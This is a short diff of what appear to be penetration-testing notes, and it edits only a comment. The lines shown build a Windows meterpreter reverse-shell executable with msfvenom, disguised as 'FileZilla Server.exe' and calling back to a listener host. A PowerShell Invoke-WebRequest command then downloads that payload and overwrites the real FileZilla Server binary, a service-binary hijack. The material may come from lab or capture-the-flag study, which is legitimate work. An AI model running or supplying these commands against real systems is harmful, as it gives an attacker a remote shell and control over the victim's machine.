@@ -124,7 +124,7 @@ Create FileZilla Server.exe reverse payload
 #msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.33.4 LPORT=2222 -f exe > 'FileZilla Server.exe'
 
 
-Download and replace the original FileZilla Server.exe place
+Download and replace the original FileZilla Server.exe place (iwr is alias of Invoke-Webrequest)
 -------------------------------------------------------------
 C:> iwr -UseBasicParsing -Uri 'http://10.10.21.2/FileZilla Server.exe' -Outfile  "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
 
